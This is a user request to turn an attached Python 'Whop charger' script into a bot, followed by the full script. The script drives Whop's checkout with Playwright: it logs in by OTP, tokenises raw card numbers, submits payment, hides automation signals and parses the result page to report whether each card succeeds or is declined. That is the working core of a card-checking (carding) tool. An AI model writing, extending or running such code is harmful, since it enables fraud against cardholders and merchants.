It contains full code with auth pay and all copy the logics from there and give me updated code for bot

#!/usr/bin/env python3
"""
WHOP CHARGER - fully self-contained (auth + payment + verdict).

Single file, no external helper files. Dependencies: playwright, httpx, chromium.
Logs into Whop via OTP (prompts for the code sent to email), then drives the
checkout: billing -> card token (BasisTheory) -> payment_method -> complete
-> Yuno 3DS SDK -> merchant verdict (success/decline/...).

Usage:
    python3 whop_charger.py <card_number> <exp_MM> <exp_YYYY> <cvc> [email]

Examples:
    python3 whop_charger.py 4242424242424242 10 2030 000 j00292384@gmail.com

Env:
    WHOP_EMAIL        buyer email (defaults to arg or j00292384@gmail.com)
    WHOP_PROFILE      profile dir (default: fresh temp dir each run)
    CHECKOUT_URL      checkout link (default: Zyloo Credits)
    BT_API_KEY        BasisTheory public key (default embedded)
    TIMEOUT           seconds to wait for verdict (default 90)
"""
import os, sys, re, time, json, tempfile, argparse

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sys.path.insert(0, "/root/c/granny-help/venv/lib/python3.14/site-packages")
    from playwright.sync_api import sync_playwright

try:
    import httpx
except ImportError:
    httpx = None

CHECKOUT_URL = os.environ.get(
    "CHECKOUT_URL",
    "https://whop.com/checkout/1baBvEndNnzoncVVrRWJd-Ce3E-3ChY-eDc9-PQeGCEMCJLU2/",
)
BT_API_KEY = os.environ.get("BT_API_KEY", "key_prod_us_pub_3gzPRk4Fuomp1aXof2qYWw")
BT_TOKEN_INTENTS = "https://js.basistheory.com/api/token-intents"
TIMEOUT = int(os.environ.get("TIMEOUT", "90"))
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"

BILLING = {
    "name": os.environ.get("BA_NAME", "Zylo QA"),
    "line1": os.environ.get("BA_LINE1", "1 Market St"),
    "city": os.environ.get("BA_CITY", "San Francisco"),
    "state": os.environ.get("BA_STATE", "CA"),
    "postalCode": os.environ.get("BA_ZIP", "94105"),
    "country": os.environ.get("BA_COUNTRY", "US"),
}
DEVICE = {
    "user_agent": UA,
    "accept_header": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "platform": os.environ.get("DEVICE_PLATFORM", "WEB"),
    "color_depth": os.environ.get("DEVICE_COLOR_DEPTH", "24"),
    "screen_height": os.environ.get("DEVICE_HEIGHT", "900"),
    "screen_width": os.environ.get("DEVICE_WIDTH", "1366"),
    "language": os.environ.get("DEVICE_LANG", "en-US"),
    "accept_browser": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept_content": "*/*",
    "java_enabled": False,
    "browser_time_difference": os.environ.get("DEVICE_TZ_DIFF", "-180"),
}


# ------------------------------------------------------------------ helpers
def bt_token(number, exp_mm, exp_yyyy, cvc):
    """BasisTheory card token-intent id from the raw PAN (standalone HTTPS)."""
    if httpx is None:
        raise RuntimeError("pip install httpx (or use the granny venv)")
    r = httpx.post(
        BT_TOKEN_INTENTS,
        headers={"BT-API-KEY": BT_API_KEY, "Content-Type": "application/json"},
        json={
            "type": "card",
            "data": {
                "number": number,
                "expiration_month": int(exp_mm),
                "expiration_year": int(exp_yyyy),
                "cvc": str(cvc),
            },
        },
        timeout=30,
    )
    if r.status_code != 201:
        raise RuntimeError(f"BasisTheory token failed {r.status_code}: {r.text[:300]}")
    return r.json()["id"]


def _sec(txt):
    m = re.search(r"secret=([^&\"'\\]+)", txt or "")
    return m.group(1) if m else None


# ------------------------------------------------------------------ auth
def install_hook(page):
    page.add_init_script("""
      window.__secs = [];
      const of = window.fetch;
      window.fetch = function(...a){
        try {
          const u = String(a[0] && a[0].url || a[0]);
          const m = u.match(/secret=(eyJ[^&]+)/);
          if (m) window.__secs.push(m[1]);
        } catch(e){}
        return of.apply(this, a);
      };
    """)


def capture_secret(page, max_secs=30):
    page.goto(CHECKOUT_URL, wait_until="domcontentloaded", timeout=60000)
    deadline = time.time() + max_secs
    while time.time() < deadline:
        time.sleep(1)
        secs = page.evaluate("window.__secs||[]")
        if secs:
            return secs[0]
    return None


def is_authed(page):
    """Check the checkout API reports an authenticated user."""
    try:
        g = page.evaluate(
            """async () => {
              try {
                const secs = window.__secs || [];
                if (!secs.length) return null;
                const m = location.pathname.match(/^\\/checkout\\/([^\\/?]+)/);
                if (!m) return null;
                const r = await fetch('/checkout/' + m[1] + '/api/?secret=' + secs[0]);
                const j = await r.json();
                return j && !!j.authenticated;
              } catch(e){ return null; }
            }"""
        )
        if g is not None:
            return g
    except Exception:
        pass
    try:
        return bool(page.evaluate(
            """async () => {
              try { const r = await fetch('https://whop.com/api/auth/token/', {credentials:'include'}); return r.status === 200; } catch(e){ return false; }
            }"""
        ))
    except Exception:
        return False


def ensure_authenticated(page, email):
    """Whop OTP login, embedded. Returns True once checkout reports authenticated."""
    install_hook(page)
    if capture_secret(page) is not None and is_authed(page):
        return True
    print("[auth] not logged in, starting OTP login...")
    page.goto("https://whop.com/login", wait_until="domcontentloaded", timeout=60000)
    time.sleep(8)
    page.locator("input[name='email']").fill(email)
    time.sleep(1)
    page.locator("button:has-text('Continue')").first.click()
    time.sleep(6)
    for attempt in range(4):
        if page.locator("input[name='otp']").count():
            otp = os.environ.get("WHOP_OTP") or input("OTP code (sent to %s): " % email).strip()
            page.locator("input[name='otp']").fill(otp)
            page.keyboard.press("Enter")
            print("[auth] submitted OTP")
            time.sleep(8)
        if capture_secret(page) is not None and is_authed(page):
            return True
    return False


# ------------------------------------------------------------------ charge
def run_charge(page, email, card):
    """Returns the merchant verdict dict."""
    token = bt_token(card[0], card[1], card[2], card[3])
    print(f"[bt] token-intent = {token}")

    page.add_init_script("""
      window.__secs = [];
      const of = window.fetch;
      window.fetch = function(...a){
        try {
          const u = String(a[0] && a[0].url || a[0]);
          const m = u.match(/secret=(eyJ[^&]+)/);
          if (m) window.__secs.push(m[1]);
        } catch(e){}
        return of.apply(this, a);
      };
    """)
    page.goto(CHECKOUT_URL, wait_until="domcontentloaded", timeout=60000)
    for _ in range(30):
        time.sleep(1)
        if page.evaluate("window.__secs||[]"):
            break
    secs = page.evaluate("window.__secs||[]")
    if not secs:
        return {"verdict": "pre_yuno_fail", "errors": "no checkout secret"}
    holder = {"secret": secs[0], "slug": None}
    m = re.search(r"/checkout/([^/?]+)", page.url)
    holder["slug"] = m.group(1) if m else None
    if not holder["slug"]:
        for u in secs:
            m2 = re.search(r"/checkout/([^/?]+)", u)
            if m2:
                holder["slug"] = m2.group(1)
                break
    if not holder["slug"]:
        return {"verdict": "pre_yuno_fail", "errors": "no checkout slug"}
    print("slug:", holder["slug"][:40])

    def call(body=None, method="PATCH"):
        r = page.evaluate(
            """async ({slug, sec, body, method}) => {
              const r = await fetch('/checkout/' + slug + '/api/?secret=' + sec,
                {method, headers:{'Content-Type':'application/json'}, body: body !== null ? JSON.stringify(body) : undefined});
              const t = await r.text();
              let j = {};
              try { j = JSON.parse(t) || {}; } catch(e) { j = {__raw: t.slice(0,120)}; }
              return {status: r.status, j};
            }""",
            {"slug": holder["slug"], "sec": holder["secret"], "body": body, "method": method})
        loc = r["j"].get("location")
        if isinstance(loc, str):
            ns, nsec = re.search(r"/checkout/([^/?]+)", loc), _sec(loc)
            if ns:
                holder["slug"] = ns.group(1)
            if nsec:
                holder["secret"] = nsec
        return r

    r1 = call({"billing_address": BILLING})
    r2 = call({"payment_method": {
        "use": {
            "processor": "multi_psp",
            "token": token,
            "type": "basis_theory_card_token",
            "device_info": DEVICE,
        }
    }})
    r3 = call({"complete": True})
    print(f"[flow] billing={r1['status']} pm={r2['status']} complete={r3['status']} status={r3['j'].get('status')} submitted={bool(r3['j'].get('submitted_at'))}")

    ad = r3["j"].get("action_data") or {}
    for i in range(20):
        time.sleep(3)
        g = call(None, "GET")
        ad = g["j"].get("action_data") or {}
        print(f"[flow] poll {i}: status={g['j'].get('status')}")
        if ad:
            break
        if g["j"].get("completed") or g["j"].get("status") not in ("processing", "action_required"):
            break
    yuno_url = ad.get("url") if isinstance(ad, dict) else None
    if not yuno_url:
        return {"verdict": "pre_yuno_fail", "status": g["j"].get("status"), "errors": g["j"].get("errors")}
    print("yuno:", yuno_url[:80])

    pg = page.context.new_page()
    try:
        pg.goto(yuno_url, wait_until="domcontentloaded", timeout=60000)
    except Exception as e:
        print("[yuno] goto:", str(e)[:100])
    verdict = None
    deadline = time.time() + TIMEOUT
    while time.time() < deadline:
        time.sleep(2)
        try:
            txt = pg.locator("body").inner_text(timeout=4000)
        except Exception:
            continue
        low = txt.lower()
        if any(k in low for k in ("doesn't support", "not support", "3d secure", "3ds",
                                  "complete", "success", "successful", "declin", "failed",
                                  "fail", "error", "insufficient", "cancel", "verify")):
            if "complete" in low or "success" in low:
                verdict = {"verdict": "success"}
            elif ("declin" in low or "not support" in low or "doesn't support" in low or
                  "fail" in low or "error" in low or "3d secure" in low or "3ds" in low):
                verdict = {"verdict": "decline", "message": re.sub(r"\s+", " ", txt)[:400]}
            else:
                verdict = {"verdict": "unknown"}
            verdict["url"] = pg.url[:140]
            break
    if not verdict:
        verdict = {"verdict": "timeout", "url": pg.url[:140]}
    return verdict


def main():
    ap = argparse.ArgumentParser(description="Whop charger (self-contained)")
    ap.add_argument("card_number")
    ap.add_argument("exp_mm")
    ap.add_argument("exp_yyyy")
    ap.add_argument("cvc")
    ap.add_argument("email", nargs="?", default=os.environ.get("WHOP_EMAIL", "j00292384@gmail.com"))
    args = ap.parse_args()

    profile = os.environ.get("WHOP_PROFILE")
    cleanup = False
    if not profile:
        profile = tempfile.mkdtemp(prefix="whop_prof_")
        cleanup = True

    card = (args.card_number, args.exp_mm, args.exp_yyyy, args.cvc)
    with sync_playwright() as p:
        ctx = p.chromium.launch_persistent_context(
            profile, headless=False, viewport={"width": 1366, "height": 900},
            user_agent=UA,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
        page = ctx.pages[0] if ctx.pages else ctx.new_page()
        if not ensure_authenticated(page, args.email):
            print(json.dumps({"verdict": "auth_failed"}))
            ctx.close()
            return
        verdict = run_charge(page, args.email, card)
        ctx.close()
    if cleanup:
        try:
            import shutil
            shutil.rmtree(profile, ignore_errors=True)
        except Exception:
            pass
    print(json.dumps(verdict, indent=2))


if __name__ == "__main__":
    main()
